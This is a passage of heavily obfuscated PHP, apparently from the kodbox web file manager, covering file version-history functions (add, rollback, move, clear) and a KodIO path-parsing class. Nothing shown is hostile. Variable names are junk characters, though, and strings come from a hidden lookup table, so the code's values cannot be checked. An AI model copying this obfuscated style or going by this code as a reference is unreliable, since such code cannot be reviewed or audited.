(!$š¿ÓÚÀ) { return; } $°Üñµˆá = self::checkInHistory($š¿ÓÚÀ); if (!$°Üñµˆá) { return; } if ($°Üñµˆá[$®µÀŒ­•[33]] == $®µÀŒ­•[199]) { $ÅÏºç“ç = self::listData($š¿ÓÚÀ); if ($ÅÏºç“ç && $ÅÏºç“ç[$®µÀŒ­•[369]]) { self::moveHistory($š¿ÓÚÀ, $”Œ›ĞŸÊ[1]); } } else { IO::rename($°Üñµˆá[$®µÀŒ­•[84]], $”Œ›ĞŸÊ[1]); } } public static function eventBeforeMove($û¹Ëœƒà) { $±ÄÛªÓæ =& $_SERVER[ñˆ‹ß¿÷]; $ƒÏšÄõí = self::parsePath($û¹Ëœƒà[0]); if (!$ƒÏšÄõí) { return; } $²ÓÜ› = self::parsePath($û¹Ëœƒà[1]); if (!$²ÓÜ›) { return; } $É¸à¬Ìš = $û¹Ëœƒà[3]; $ÔØ«äà = self::checkInHistory($ƒÏšÄõí); if (!$ÔØ«äà) { return; } $–ÑäÈ‡× = self::pathHistory($²ÓÜ›); if ($ÔØ«äà[$±ÄÛªÓæ[33]] == $±ÄÛªÓæ[199]) { $°¤¡º‘¬ = self::listData($ƒÏšÄõí); $Ú—Ÿ×‘ = rtrim($²ÓÜ›, $±ÄÛªÓæ[8]) . $±ÄÛªÓæ[8] . ($É¸à¬Ìš ? $É¸à¬Ìš : get_path_this($ƒÏšÄõí)); $ûÄ‹˜«ö = self::listData($Ú—Ÿ×‘); if ($°¤¡º‘¬ && $°¤¡º‘¬[$±ÄÛªÓæ[369]] && $ûÄ‹˜«ö && $ûÄ‹˜«ö[$±ÄÛªÓæ[369]]) { return self::clear($ƒÏšÄõí); } if ($°¤¡º‘¬ && $°¤¡º‘¬[$±ÄÛªÓæ[369]]) { self::moveHistory($ƒÏšÄõí, $É¸à¬Ìš, $–ÑäÈ‡×); } } else { IO::move($ÔØ«äà[$±ÄÛªÓæ[84]], $–ÑäÈ‡×, !1, $É¸à¬Ìš); self::clearEmptyFolder(IO::pathFather($ÔØ«äà[$±ÄÛªÓæ[84]])); } } public static function eventAfterRemove($ÍÜ§ƒºØ, $Ì–Ô€šÄ) { $×è™ÉÈ =& $_SERVER[ñˆ‹ß¿÷]; if (!$Ì–Ô€šÄ) { return; } $ê·òé½Û = self::parsePath($ÍÜ§ƒºØ[0]); if (!$ê·òé½Û) { return; } $­“áÏşè = self::checkInHistory($ê·òé½Û); if (!$­“áÏşè) { return; } if ($­“áÏşè[$×è™ÉÈ[33]] == $×è™ÉÈ[199]) { $ÏÓÑ»œ = self::listData($ê·òé½Û, !1); if ($ÏÓÑ»œ && $ÏÓÑ»œ[$×è™ÉÈ[369]]) { self::clear($ê·òé½Û, !1); } } else { IO::remove($­“áÏşè[$×è™ÉÈ[84]]); self::clearEmptyFolder(IO::pathFather($­“áÏşè[$×è™ÉÈ[84]])); } } private static function checkInHistory($¤Ä‹é¨€) { $ôÁ¢ö“Œ = self::pathHistory($¤Ä‹é¨€); if (!IO::exist($ôÁ¢ö“Œ)) { $ôÁ¢ö“Œ .= $_SERVER[ñˆ‹ß¿÷][1230]; } return IO::exist($ôÁ¢ö“Œ) ? IO::info($ôÁ¢ö“Œ) : !1; } private static function parsePath($Ì…Äè†ø) { $  ËÏ† =& $_SERVER[ñˆ‹ß¿÷]; if (!$Ì…Äè†ø) { return !1; } if ($GLOBALS[$  ËÏ†[1231]]) { return; } $›ïˆÍæô = KodIO::parse($Ì…Äè†ø); $çãÏ¨µó = $›ïˆÍæô[$  ËÏ†[33]]; $Ö¼¼Æ¯ = !$çãÏ¨µó || $çãÏ¨µó == KodIO::KOD_IO || $çãÏ¨µó == KodIO::KOD_SHARE_ITEM; if (!$Ö¼¼Æ¯ || !$›ïˆÍæô[$  ËÏ†[1232]]) { return !1; } if (substr($Ì…Äè†ø, 0, strlen(DATA_PATH . $  ËÏ†[1233])) == DATA_PATH . $  ËÏ†[1233]) { return !1; } if ($çãÏ¨µó == KodIO::KOD_SHARE_ITEM) { $ô¡¯™İ“ = IO::init($Ì…Äè†ø); if ($ô¡¯™İ“->pathParse[$  ËÏ†[1158]]) { return self::parsePath($ô¡¯™İ“->pathParse[$  ËÏ†[1158]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¯Ë€¯óœ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $  ËÏ†[1234]); foreach ($¯Ë€¯óœ as $¶†ÑÙÔ²) { if (!$çãÏ¨µó && substr($Ì…Äè†ø, 0, strlen($¶†ÑÙÔ²)) == $¶†ÑÙÔ²) { return !1; } } self::log($GLOBALS[$  ËÏ†[1153]] . $  ËÏ†[1235] . $Ì…Äè†ø); return $Ì…Äè†ø; } private static function pathHistory($••ÜÁ) { $™ÜÀÙØ´ =& $_SERVER[ñˆ‹ß¿÷]; $÷øöÙ¢® = self::$_historyBase . ltrim(KodIO::clear($••ÜÁ), $™ÜÀÙØ´[8]); $÷øöÙ¢® = str_replace(array($™ÜÀÙØ´[1236]), array($™ÜÀÙØ´[1237]), $÷øöÙ¢®); return $÷øöÙ¢®; } public static function log($ÒÆ¡ÄÌà) { } public static function historyCount($®™ÕÁö¶) { $Ìó¬ëåÚ =& $_SERVER[ñˆ‹ß¿÷]; $İºƒÊ“Ï = array(); $¸ğåöó = array(); foreach ($®™ÕÁö¶ as $‡°õ§õì) { $ü“²ñÒÅ = get_path_father($‡°õ§õì); if (!$¸ğåöó[$ü“²ñÒÅ]) { $¸ğåöó[$ü“²ñÒÅ] = array(); } $¸ğåöó[$ü“²ñÒÅ][] = get_path_this($‡°õ§õì); } foreach ($¸ğåöó as $ü“²ñÒÅ => $˜ù˜—³¸) { $Ê¹ê‰û€ = self::parsePath($ü“²ñÒÅ); if (!$Ê¹ê‰û€) { continue; } foreach ($˜ù˜—³¸ as $šã¢¦™) { $…€üùİ = self::listData(rtrim($Ê¹ê‰û€, $Ìó¬ëåÚ[8]) . $Ìó¬ëåÚ[8] . $šã¢¦™, !1); if ($…€üùİ && $…€üùİ[$Ìó¬ëåÚ[369]]) { $İºƒÊ“Ï[rtrim($ü“²ñÒÅ, $Ìó¬ëåÚ[8]) . $Ìó¬ëåÚ[8] . $šã¢¦™] = count($…€üùİ[$Ìó¬ëåÚ[369]]); } } } return $İºƒÊ“Ï; } public static function add($‡»ëÛşŸ) { $›””â¥ =& $_SERVER[ñˆ‹ß¿÷]; $’¹Ëì–Í = self::listData($‡»ëÛşŸ); if (!$’¹Ëì–Í) { return; } $ÌÅŸï’ş = Model($›””â¥[777])->get($›””â¥[1238]); $òëõŒ˜œ = $GLOBALS[$›””â¥[6]][$›””â¥[89]][$›””â¥[1216]]; $ûÔÅ¿ê¨ = $ÌÅŸï’ş == $›””â¥[1239] ? min(5, $òëõŒ˜œ) : $òëõŒ˜œ; if ($òëõŒ˜œ <= 0) { return; } $ÈÛ¯•éƒ = IO::info($‡»ëÛşŸ); $ğƒÒä¹— = $’¹Ëì–Í[$›””â¥[369]]; if ($ÈÛ¯•éƒ[$›””â¥[76]] == 0) { return; } if ($ÈÛ¯•éƒ[$›””â¥[76]] >= 1024 * 1024 * 500) { return !1; } $ü”¢·ªÁ = IO::hashSimple($‡»ëÛşŸ); if ($ğƒÒä¹— && $ğƒÒä¹—[0][$›””â¥[177]] == $ü”¢·ªÁ) { return !0; } if (array_key_exists($›””â¥[202], $ÈÛ¯•éƒ) && !$ÈÛ¯•éƒ[$›””â¥[202]]) { return !1; } $ÍÈê¿§¦ = short_id(time()); $Ÿ§‹¿“ = array($›””â¥[399] => $ÍÈê¿§¦, $›””â¥[177] => $ü”¢·ªÁ, $›””â¥[32] => $ÈÛ¯•éƒ[$›””â¥[32]] . $›””â¥[10] . date($›””â¥[1240]) . rand_string(1), $›””â¥[76] => $ÈÛ¯•éƒ[$›””â¥[76]], $›””â¥[454] => USER_ID, $›””â¥[200] => time(), $›””â¥[1241] => $›””â¥[12]); IO::mkdir($’¹Ëì–Í[$›””â¥[1242]]); $†ğ”ƒ†¨ = IO::copy($‡»ëÛşŸ, $’¹Ëì–Í[$›””â¥[1242]], !1, $Ÿ§‹¿“[$›””â¥[32]]); if (!$†ğ”ƒ†¨) { self::clearEmptyFolder($’¹Ëì–Í[$›””â¥[1242]]); return !1; } array_unshift($ğƒÒä¹—, $Ÿ§‹¿“); if (count($ğƒÒä¹—) > $ûÔÅ¿ê¨) { $Ä¬ÚºóÓ = array_slice($ğƒÒä¹—, $ûÔÅ¿ê¨); foreach ($Ä¬ÚºóÓ as $¤“ØÂ•Ï) { IO::remove($’¹Ëì–Í[$›””â¥[1242]] . $¤“ØÂ•Ï[$›””â¥[32]]); } $ğƒÒä¹— = array_slice($ğƒÒä¹—, 0, $ûÔÅ¿ê¨); } return self::saveData($’¹Ëì–Í[$›””â¥[1243]], $ğƒÒä¹—); } public static function remove($ë£Œ™Á¸, $ŸŞû¶™) { $é¯€€â =& $_SERVER[ñˆ‹ß¿÷]; $ú‡×­¶ = self::listData($ë£Œ™Á¸); $©Ôöó = array(); if (!$ú‡×­¶) { return !1; } foreach ($ú‡×­¶[$é¯€€â[369]] as $ÈÔ£š¨÷) { if ($ÈÔ£š¨÷[$é¯€€â[399]] == $ŸŞû¶™) { IO::remove($ú‡×­¶[$é¯€€â[1242]] . $ÈÔ£š¨÷[$é¯€€â[32]]); continue; } $©Ôöó[] = $ÈÔ£š¨÷; } return self::saveData($ú‡×­¶[$é¯€€â[1243]], $©Ôöó); } public static function clear($ÎäÈ”×, $‰ßİŠÁ = true) { $£Ü¨ÍÖˆ =& $_SERVER[ñˆ‹ß¿÷]; $ŞÂü¼‘• = self::listData($ÎäÈ”×, $‰ßİŠÁ); if (!$ŞÂü¼‘•) { return !1; } foreach ($ŞÂü¼‘•[$£Ü¨ÍÖˆ[369]] as $Äë¹Ú´“) { IO::remove($ŞÂü¼‘•[$£Ü¨ÍÖˆ[1242]] . $Äë¹Ú´“[$£Ü¨ÍÖˆ[32]]); } return self::saveData($ŞÂü¼‘•[$£Ü¨ÍÖˆ[1243]], array()); } public static function moveHistory($Òˆ¼®éû, $ËÛÙæ—« = '', $ä•À“ùõ = '') { $â‰µı˜Ò =& $_SERVER[ñˆ‹ß¿÷]; $ÅÎñ¦Œµ = self::listData($Òˆ¼®éû, !1); if (!$ÅÎñ¦Œµ || !$ÅÎñ¦Œµ[$â‰µı˜Ò[369]]) { return !1; } $ÑŠ‰ÍØ = $â‰µı˜Ò[1230]; $ËÛÙæ—« = $ËÛÙæ—« ? $ËÛÙæ—« : get_path_this($Òˆ¼®éû); $ä•À“ùõ = $ä•À“ùõ ? $ä•À“ùõ : $ÅÎñ¦Œµ[$â‰µı˜Ò[1242]]; $çˆÃˆÁ = substr(get_path_this($ÅÎñ¦Œµ[$â‰µı˜Ò[1243]]), 0, -strlen($ÑŠ‰ÍØ)); foreach ($ÅÎñ¦Œµ[$â‰µı˜Ò[369]] as $¶óÔô€² => $¤•À§) { $ˆí¹ª½€ = $ËÛÙæ—« . substr($¤•À§[$â‰µı˜Ò[32]], strlen($çˆÃˆÁ)); $¬–˜±öæ = IO::move($ÅÎñ¦Œµ[$â‰µı˜Ò[1242]] . $¤•À§[$â‰µı˜Ò[32]], $ä•À“ùõ, !1, $ˆí¹ª½€); if ($¬–˜±öæ) { $ÅÎñ¦Œµ[$â‰µı˜Ò[369]][$¶óÔô€²][$â‰µı˜Ò[32]] = $ˆí¹ª½€; } } $ÅÎñ¦Œµ[$â‰µı˜Ò[1243]] = IO::move($ÅÎñ¦Œµ[$â‰µı˜Ò[1243]], $ä•À“ùõ, !1, $ËÛÙæ—« . $ÑŠ‰ÍØ); self::saveData($ÅÎñ¦Œµ[$â‰µı˜Ò[1243]], $ÅÎñ¦Œµ[$â‰µı˜Ò[369]]); self::clearEmptyFolder($ÅÎñ¦Œµ[$â‰µı˜Ò[1242]]); } public static function rollback($Í…€ˆçå, $Ô¼×«…¦) { $¦•¤‰• =& $_SERVER[ñˆ‹ß¿÷]; $ÂªƒĞ¼§ = self::listData($Í…€ˆçå); if (!$ÂªƒĞ¼§) { return; } $ËŒ¡ü–î = IO::info($Í…€ˆçå); foreach ($ÂªƒĞ¼§[$¦•¤‰•[369]] as $Ï“øÒË => $¿Ë É¨ˆ) { if ($¿Ë É¨ˆ[$¦•¤‰•[399]] == $Ô¼×«…¦) { self::add($Í…€ˆçå); $Òøé€ë³ = $ÂªƒĞ¼§[$¦•¤‰•[1242]] . $¿Ë É¨ˆ[$¦•¤‰•[32]]; $òŒòæß = IO::copy($Òøé€ë³, IO::pathFather($Í…€ˆçå), REPEAT_REPLACE, $ËŒ¡ü–î[$¦•¤‰•[32]]); if ($òŒòæß) { self::remove($Í…€ˆçå, $Ô¼×«…¦); } return $òŒòæß; } } return !1; } public static function setDetail($Ëß±£ëå, $ˆ–ùâòó, $œÑöÉù¼) { $Ğ¿¦ŞÔ¢ =& $_SERVER[ñˆ‹ß¿÷]; $§¤šÌ§ = self::listData($Ëß±£ëå); if (!$§¤šÌ§) { return; } foreach ($§¤šÌ§[$Ğ¿¦ŞÔ¢[369]] as $ê¼ï•Ú¡ => $™ó¡Ã) { if ($™ó¡Ã[$Ğ¿¦ŞÔ¢[399]] == $ˆ–ùâòó) { $§¤šÌ§[$Ğ¿¦ŞÔ¢[369]][$ê¼ï•Ú¡][$Ğ¿¦ŞÔ¢[1241]] = $œÑöÉù¼; self::saveData($§¤šÌ§[$Ğ¿¦ŞÔ¢[1243]], $§¤šÌ§[$Ğ¿¦ŞÔ¢[369]]); return !0; } } return !1; } public static function fileInfo($ÇÉòø‚Ú, $‚—áÃÚé) { $–¥ØÍİ† =& $_SERVER[ñˆ‹ß¿÷]; $à§şñ‰¤ = self::listData($ÇÉòø‚Ú); if (!$à§şñ‰¤) { show_json(LNG($–¥ØÍİ†[105]), !1); } $µâèî³— = $–¥ØÍİ†[12]; foreach ($à§şñ‰¤[$–¥ØÍİ†[369]] as $–ÎãüüÊ => $½–óšò) { if ($½–óšò[$–¥ØÍİ†[399]] != $‚—áÃÚé) { continue; } $µâèî³— = $à§şñ‰¤[$–¥ØÍİ†[1242]] . $½–óšò[$–¥ØÍİ†[32]]; break; } if (!$µâèî³—) { show_json(LNG($–¥ØÍİ†[105]), !1); } return IO::info($µâèî³—); } public static function fileOut($¤’êŠ”Ö, $şˆ­¼ë, $ı­åäñØ = false) { $ø™èÕ¯ò =& $_SERVER[ñˆ‹ß¿÷]; $ô«²³´ = self::fileInfo($¤’êŠ”Ö, $şˆ­¼ë); $¹Â˜áİ =& $GLOBALS[$ø™èÕ¯ò[7]]; $ı­åäñØ = isset($¹Â˜áİ[$ø™èÕ¯ò[1206]]) && $¹Â˜áİ[$ø™èÕ¯ò[1206]] == 1; if (isset($¹Â˜áİ[$ø™èÕ¯ò[33]]) && $¹Â˜áİ[$ø™èÕ¯ò[33]] == $ø™èÕ¯ò[1244]) { return IO::fileOutImage($ô«²³´[$ø™èÕ¯ò[84]], $¹Â˜áİ[$ø™èÕ¯ò[1245]]); } IO::fileOut($ô«²³´[$ø™èÕ¯ò[84]], $ı­åäñØ, get_path_this($¤’êŠ”Ö)); } public static function listData($õœÙşø, $ÓÔ¨ëú = true) { $½¬—é‡“ =& $_SERVER[ñˆ‹ß¿÷]; if ($ÓÔ¨ëú && !IO::exist($õœÙşø)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($õœÙşø, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ƒõ©ùĞƒ = self::pathHistory($õœÙşø); $ÅªÂ¥€ë = array($½¬—é‡“[1243] => $ƒõ©ùĞƒ . $½¬—é‡“[1230], $½¬—é‡“[1242] => rtrim(get_path_father($ƒõ©ùĞƒ), $½¬—é‡“[8]) . $½¬—é‡“[8], $½¬—é‡“[369] => array()); $‘ê˜Î İ = IO::getContent($ÅªÂ¥€ë[$½¬—é‡“[1243]]); if ($‘ê˜Î İ) { $µÊÔ  × = json_decode($‘ê˜Î İ, !0); if (is_array($µÊÔ  ×)) { $ÅªÂ¥€ë[$½¬—é‡“[369]] = $µÊÔ  ×; } } return $ÅªÂ¥€ë; } private static function saveData($¤•Ø¢ïÛ, $Ü›°¥€ë) { $‚ÃÄ™¢ı =& $_SERVER[ñˆ‹ß¿÷]; self::log($‚ÃÄ™¢ı[1246] . $¤•Ø¢ïÛ . $‚ÃÄ™¢ı[71] . count($Ü›°¥€ë), $‚ÃÄ™¢ı[759]); if ($Ü›°¥€ë) { return IO::setContent($¤•Ø¢ïÛ, json_encode($Ü›°¥€ë)); } $ÌĞà€á¹ = IO::pathFather($¤•Ø¢ïÛ); IO::remove($¤•Ø¢ïÛ); self::clearEmptyFolder($ÌĞà€á¹); return !0; } public static function clearEmptyFolder($–İ¡®Ò©) { $àÜÒæ =& $_SERVER[ñˆ‹ß¿÷]; if (trim($–İ¡®Ò©, $àÜÒæ[8]) == trim(self::$_historyBase, $àÜÒæ[8])) { return; } $¨Ó®øøü = IO::pathFather($–İ¡®Ò©); $½Œä½à = IO::has($–İ¡®Ò©, !0); if ($½Œä½à[$àÜÒæ[207]] > 0 || $½Œä½à[$àÜÒæ[208]] > 0) { return; } IO::remove($–İ¡®Ò©); self::clearEmptyFolder($¨Ó®øøü); } private static function getBasePath() { $’Õåğ”Ç =& $_SERVER[ñˆ‹ß¿÷]; $êù¯úÕŸ = Model($’Õåğ”Ç[1247])->get($’Õåğ”Ç[1248]); if ($êù¯úÕŸ) { if (!IO::exist($êù¯úÕŸ)) { IO::mkdir($êù¯úÕŸ); } if (get_path_this($êù¯úÕŸ) == $’Õåğ”Ç[1233]) { $¤ì‰†…¥ = $’Õåğ”Ç[1249] . rand_string(8); @rename($êù¯úÕŸ, get_path_father($êù¯úÕŸ) . $’Õåğ”Ç[8] . $¤ì‰†…¥); $êù¯úÕŸ = DATA_PATH . $¤ì‰†…¥ . $’Õåğ”Ç[8]; file_put_contents(DATA_PATH . $’Õåğ”Ç[1250], $’Õåğ”Ç[12]); Model($’Õåğ”Ç[1247])->set($’Õåğ”Ç[1248], $êù¯úÕŸ); } return $êù¯úÕŸ; } $êù¯úÕŸ = DATA_PATH . $’Õåğ”Ç[1249] . rand_string(8) . $’Õåğ”Ç[8]; $êù¯úÕŸ = IO::mkdir($êù¯úÕŸ); $êù¯úÕŸ = rtrim($êù¯úÕŸ, $’Õåğ”Ç[8]) . $’Õåğ”Ç[8]; file_put_contents($êù¯úÕŸ . $’Õåğ”Ç[1250], $’Õåğ”Ç[12]); file_put_contents(DATA_PATH . $’Õåğ”Ç[1250], $’Õåğ”Ç[12]); Model($’Õåğ”Ç[1247])->set($’Õåğ”Ç[1248], $êù¯úÕŸ); return $êù¯úÕŸ; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\145\162\x52\145\143\x79\143\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\x72\x46\x69\x6c\x65\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\151\x6c\145\x54\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\x70\122\x6f\157\x74\123\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\x53\x68\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\162\x53\150\141\162\x65\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\145\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\145\x49\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\x65\111\x74\x65\x6d\x4c\151\156\x6b\x7d"; const KOD_SEARCH = "\173\163\145\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\153\175"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\162\x52\145\156\143\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\145\x72\x7d"; public static function typeList() { $ëÒÁÄøé =& $_SERVER[ñˆ‹ß¿÷]; return array($ëÒÁÄøé[1251] => self::KOD_SOURCE, $ëÒÁÄøé[1252] => self::KOD_USER_RECYCLE, $ëÒÁÄøé[1253] => self::KOD_USER_FAV, $ëÒÁÄøé[1254] => self::KOD_USER_FILE_TAG, $ëÒÁÄøé[1255] => self::KOD_USER_FILE_TYPE, $ëÒÁÄøé[1256] => self::KOD_GROUP_ROOT_SELF, $ëÒÁÄøé[1257] => self::KOD_USER_SHARE, $ëÒÁÄøé[1258] => self::KOD_USER_SHARE_LINK, $ëÒÁÄøé[1259] => self::KOD_USER_SHARE_TO_ME, $ëÒÁÄøé[1260] => self::KOD_SHARE_ITEM, $ëÒÁÄøé[1261] => self::KOD_SHARE_LINK, $ëÒÁÄøé[1262] => self::KOD_SEARCH, $ëÒÁÄøé[1263] => self::KOD_BLOCK, $ëÒÁÄøé[1264] => self::KOD_IO, $ëÒÁÄøé[1265] => self::KOD_USER_RECENT, $ëÒÁÄøé[1266] => self::KOD_USER_DRIVER); } public static function parse($ÖñÍ¿÷‹) { $£­˜…ÔÇ =& $_SERVER[ñˆ‹ß¿÷]; $ÖñÍ¿÷‹ = self::clear($ÖñÍ¿÷‹); $¦ßæ¢ÃÙ = array_values(self::typeList()); preg_match($£­˜…ÔÇ[1267], $ÖñÍ¿÷‹, $¿ÍÁÛİ); $—£ı÷Å“ = array($£­˜…ÔÇ[422] => !1, $£­˜…ÔÇ[1268] => !1, $£­˜…ÔÇ[419] => !1, $£­˜…ÔÇ[84] => $ÖñÍ¿÷‹, $£­˜…ÔÇ[1177] => !1, $£­˜…ÔÇ[1176] => $£­˜…ÔÇ[12]); if (is_array($¿ÍÁÛİ) && count($¿ÍÁÛİ) == 5) { $õ¿¹û¢² = $£­˜…ÔÇ[1269] . $¿ÍÁÛİ[2] . $£­˜…ÔÇ[327]; if (in_array($õ¿¹û¢², $¦ßæ¢ÃÙ)) { $—£ı÷Å“[$£­˜…ÔÇ[1177]] = $¿ÍÁÛİ[1]; $—£ı÷Å“[$£­˜…ÔÇ[33]] = $õ¿¹û¢²; $—£ı÷Å“[$£­˜…ÔÇ[1270]] = substr($õ¿¹û¢², 1, -1); $—£ı÷Å“[$£­˜…ÔÇ[399]] = $¿ÍÁÛİ[3]; } $—£ı÷Å“[$£­˜…ÔÇ[1176]] = $¿ÍÁÛİ[4]; } $İÎ¨¯€² = array($£­˜…ÔÇ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $—£ı÷Å“[$£­˜…ÔÇ[1232]] = in_array($—£ı÷Å“[$£­˜…ÔÇ[33]], $İÎ¨¯€²); return $—£ı÷Å“; } public static function isTruePath($‘“‘Ï¯) { $±¨éªÎÉ =& $_SERVER[ñˆ‹ß¿÷]; if (substr($‘“‘Ï¯, 0, 1) != $±¨éªÎÉ[1269]) { return !0; } if (strpos($‘“‘Ï¯, $±¨éªÎÉ[408]) === 0) { return !0; } if (strpos($‘“‘Ï¯, $±¨éªÎÉ[1236]) === 0) { return !0; } if (strpos($‘“‘Ï¯, $±¨éªÎÉ[1271]) === 0) { return !0; } if (strpos($‘“‘Ï¯, $±¨éªÎÉ[1272]) === 0) { return !0; } if (strpos($‘“‘Ï¯, $±¨éªÎÉ[1273]) === 0) { return !0; } return !1; } public static function clear($€Ş¯‚Ò®) { $ÜûÚµ˜Ø =& $_SERVER[ñˆ‹ß¿÷]; $€Ş¯‚Ò® = str_replace(array($ÜûÚµ˜Ø[1085], $ÜûÚµ˜Ø[231]), $ÜûÚµ˜Ø[53], $€Ş¯‚Ò®); $€Ş¯‚Ò® = str_replace($ÜûÚµ˜Ø[97], $ÜûÚµ˜Ø[8], $€Ş¯‚Ò®); $ÛÄüÙü® = $ÜûÚµ˜Ø[1274]; if (substr($€Ş¯‚Ò®, 0, 3) == $ÜûÚµ˜Ø[1275]) { $€Ş¯‚Ò® = substr($€Ş¯‚Ò®, 3); } while (strstr($€Ş¯‚Ò®, $ÛÄüÙü®)) { $€Ş¯‚Ò® = str_replace($ÛÄüÙü®, $ÜûÚµ˜Ø[8], $€Ş¯‚Ò®); } $€Ş¯‚Ò® = preg_replace($ÜûÚµ˜Ø[1276], $ÜûÚµ˜Ø[8], $€Ş¯‚Ò®); if ($€Ş¯‚Ò® == $ÜûÚµ˜Ø[8]) { return $ÜûÚµ˜Ø[8]; } $€Ş¯‚Ò® = rtrim($€Ş¯‚Ò®, $ÜûÚµ˜Ø[8]); return $€Ş¯‚Ò®; } public static function sourceID($Ÿ‚°Õš’) { $Ô¶£»Ö¸ =& $_SERVER[ñˆ‹ß¿÷]; $îû¨Ù = self::parse($Ÿ‚°Õš’); if ($îû¨Ù[$Ô¶£»Ö¸[33]] !== self::KOD_SOURCE) { show_json(LNG($Ô¶£»Ö¸[1277]), !1); } return $îû¨Ù[$Ô¶£»Ö¸[399]]; } public static function make($—äÁƒË¨) { if (!$—äÁƒË¨) { return !1; } return self::makePath(self::KOD_SOURCE, intval($—äÁƒË¨)); } public static function makeShare($½¢ˆáÂ‰, $öå®ˆõò) { return self::makePath(self::KOD_SHARE_ITEM, $½¢ˆáÂ‰, $öå®ˆõò); } public static function makeFileTypePath($´û´ËÏà) { return self::makePath(self::KOD_USER_FILE_TYPE, $´û´ËÏà); } public static function makeFileTagPath($Š¢ «ñÕ) { return self::makePath(self::KOD_USER_FILE_TAG, $Š¢ «ñÕ); } public static function makePath($Æ•ˆÊ»Ó, $õ¯ğùÅ¾ = '', $ÒÓÈù¾ = '') { $²­çİ± =& $_SERVER[ñˆ‹ß¿÷]; $Ä‚ÈœÃ¨ = substr($Æ•ˆÊ»Ó, 1, -1); $Ó¿Èø© = $²­çİ±[1278] . $Ä‚ÈœÃ¨ . $²­çİ±[1279] . $õ¯ğùÅ¾ . $²­çİ±[1280]; $Ó¿Èø© = $ÒÓÈù¾ ? $Ó¿Èø© . $ÒÓÈù¾ . $²­çİ±[8] : $Ó¿Èø©; return $Ó¿Èø©; } public static function hashPath($î‚·Â£Â, $ØˆŞƒ¹Á = true) { $ëç”ƒ™Ô =& $_SERVER[ñˆ‹ß¿÷]; $¤ìİÄéç = is_array($î‚·Â£Â) ? $î‚·Â£Â : IO::info($î‚·Â£Â); $ëÌ‡´ç¹ = _get($¤ìİÄéç, $ëç”ƒ™Ô[1281], $ëç”ƒ™Ô[12]); if (!$ëÌ‡´ç¹ && isset($¤ìİÄéç[$ëç”ƒ™Ô[402]])) { $¤ìİÄéç = IO::info(KodIO::make($¤ìİÄéç[$ëç”ƒ™Ô[402]])); $ëÌ‡´ç¹ = _get($¤ìİÄéç, $ëç”ƒ™Ô[1281], $ëç”ƒ™Ô[12]); } if (!$ëÌ‡´ç¹ && $ØˆŞƒ¹Á) { $¹Ú‡§§Ì = KodIO::parse($¤ìİÄéç[$ëç”ƒ™Ô[84]]); if (!$¹Ú‡§§Ì[$ëç”ƒ™Ô[33]]) { $ëÌ‡´ç¹ = IO::hashSimple($¤ìİÄéç[$ëç”ƒ™Ô[84]]); } } if (!$ëÌ‡´ç¹) { $ëÌ‡´ç¹ = md5($¤ìİÄéç[$ëç”ƒ™Ô[84]] . $¤ìİÄéç[$ëç”ƒ™Ô[76]] . $¤ìİÄéç[$ëç”ƒ™Ô[85]]); } return $ëÌ‡´ç¹; } public static function initSystemPath() { $Áì½§­• =& $_SERVER[ñˆ‹ß¿÷]; if (defined($Áì½§­•[1282])) { return; } define($Áì½§­•[1282], self::systemPath($Áì½§­•[1283])); define($Áì½§­•[1284], self::systemPath($Áì½§­•[1285])); define($Áì½§­•[1286], self::systemPath($Áì½§­•[1287])); define($Áì½§­•[1288], self::systemPath($Áì½§­•[1289])); IOHistory::bindEvent(); } public static function systemPath($œ´è”Àè) { $—«‰•¬‡ =& $_SERVER[ñˆ‹ß¿÷]; $ğİÛ…µ = $—«‰•¬‡[1290] . ucfirst($œ´è”Àè); $È£Õ½âĞ = Model($—«‰•¬‡[777])->get($ğİÛ…µ); if ($È£Õ½âĞ) { return $È£Õ½âĞ; } if ($œ´è”Àè == $—«‰•¬‡[1283]) { $È£Õ½âĞ = self::make(Model($—«‰•¬‡[832])->systemRootPathAdd($—«‰•¬‡[544])); } else { $È£Õ½âĞ = self::systemPath($—«‰•¬‡[1283]); $¸Üú²‡– = self::sourceID($È£Õ½âĞ); $È£Õ½âĞ = self::make(Model($—«‰•¬‡[832])->mkdir($¸Üú²‡–, $œ´è”Àè)); } Model($—«‰•¬‡[777])->set($ğİÛ…µ, $È£Õ½âĞ); return $È£Õ½âĞ; } public static function systemFolder($ßÇÀï) { $¬€­©‰Ò = IO_PATH_SYSTEM_SOURCE . $ßÇÀï; $ùûé£¯’ = Cache::get($¬€­©‰Ò); if (!$ùûé£¯’) { $ôœÃåÒ¥ = IO::infoFull($¬€­©‰Ò); if (!$ôœÃåÒ¥) { $ùûé£¯’ = IO::mkdir($¬€­©‰Ò, REPEAT_SKIP); } else { $ùûé£¯’ = $ôœÃåÒ¥[$_SERVER[ñˆ‹ß¿÷][84]]; } Cache::set($¬€­©‰Ò, $ùûé£¯’, 3600 * 10); } return $ùûé£¯’; } public static function defaultDriver() { return Model($_SERVER[ñˆ‹ß¿÷][774])->defaultDriver(); } public static function defaultIO() { $æ®«‘ö² =& $_SERVER[ñˆ‹ß¿÷]; $Öáµ–›° = self::defaultDriver(); return 